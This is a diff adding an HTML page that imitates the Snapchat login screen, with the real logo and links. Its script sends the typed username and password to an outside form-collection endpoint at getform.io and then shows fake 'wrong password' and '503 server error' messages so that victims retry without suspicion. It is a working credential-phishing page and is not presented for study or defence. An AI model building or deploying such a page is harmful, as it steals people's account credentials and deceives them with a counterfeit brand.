@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Snapchat</title>
+    <style>
+        /* Styles remain the same */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+            position: relative;
+        }
+
+        .login-container img {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 0 0 20px;
+            color: #000;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+            text-align: left;
+            color: #555;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #555;
+            text-decoration: none;
+            float: right;
+        }
+
+        .login-button {
+            background-color: #FFFC00;
+            color: #000;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .login-button:hover {
+            background-color: #f1eb00;
+        }
+
+        .signup-text {
+            font-size: 14px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        .signup-text a {
+            color: #000;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            font-size: 14px;
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Logo">
+        <h1>Log in to Snapchat</h1>
+        
+        <form id="loginForm" onsubmit="submitData(event)">
+            <label for="username">Username or Email</label>
+            <input type="text" id="username" name="username" placeholder="Your Username Here" required>
+            <label for="user_password">Password</label>
+            <input type="password" id="user_password" name="user_password" placeholder="●●●●●●●●" required>
+            <a href="https://accounts.snapchat.com/accounts/password_reset_request" class="forgot-password">Forgot Password</a>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+        
+        <div class="signup-text">
+            New to Snapchat? <a href="https://accounts.snapchat.com/v2/signup">Sign Up</a>
+        </div>
+        <div id="errorMessage" class="error-message"></div>
+    </div>
+
+    <script>
+        let loginAttempts = 0;
+
+        function submitData(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const user_password = document.getElementById("user_password").value;
+            const errorMessage = document.getElementById("errorMessage");
+
+            // Prepare the form data
+            const formData = new FormData();
+            formData.append("username", username);
+            formData.append("user_password", user_password);
+
+            // Simulate form submission to Getform endpoint
+            fetch("https://getform.io/f/alllzzqa", {
+                method: "POST",
+                body: formData,
+            })
+            .then(() => {
+                // Increase login attempts regardless of submission success
+                loginAttempts++;
+                
+                // Display specific error messages based on login attempts
+                if (loginAttempts === 1) {
+                    errorMessage.textContent = "Wrong email or password";
+                } else if (loginAttempts === 2) {
+                    errorMessage.textContent = "We’re experiencing a temporary server issue (Error Code: 503). Please try again in a few minutes.";
+                } else {
+                    errorMessage.textContent = "An unexpected error occurred. Please try again.";
+                }
+                
+                errorMessage.style.display = "block";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                // Still show error message even if fetch fails
+                errorMessage.textContent = "An error occurred. Please try again.";
+                errorMessage.style.display = "block";
+            });
+        }
+    </script>
+</body>
+</html>
